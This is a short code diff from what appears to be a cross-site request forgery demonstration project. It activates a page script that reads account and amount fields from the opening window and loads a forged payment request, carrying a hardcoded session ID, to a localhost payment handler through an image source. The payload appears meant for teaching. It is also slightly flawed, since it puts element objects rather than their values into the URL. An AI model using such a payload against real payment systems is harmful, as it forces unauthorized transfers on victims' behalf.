@@ -8,13 +8,13 @@
 </div>
 </body>
 <script>
-   alert("Hello");
-   // var doc = window.opener.document;
-   // var acc = doc.getElementById('acc_no2');
-   // var amt = doc.getElementById('amt2');   
-   // var link_rel = "http://localhost:81/CSRFDemonstration/Reflected/handle_payments.php?acc_no=" + acc + "&amount=" + amt + "&sessionID=elsm34cmmpbed371b3li7sd6j3";
    // alert("Hello");
-   // window.document.getElementById("im").src = link_rel;
-   // alert(window.document.getElementById("im").src);
+   var doc = window.opener.document;
+   var acc = doc.getElementById('acc_no2');
+   var amt = doc.getElementById('amt2');   
+   var link_rel = "http://localhost:81/CSRFDemonstration/Reflected/handle_payments.php?acc_no=" + acc + "&amount=" + amt + "&sessionID=bkq0amk4s451gmmfdd8tt02f70";
+   // alert("Hello");
+   window.document.getElementById("im").src = link_rel;
+   alert(window.document.getElementById("im").src);
 </script>
 </html>
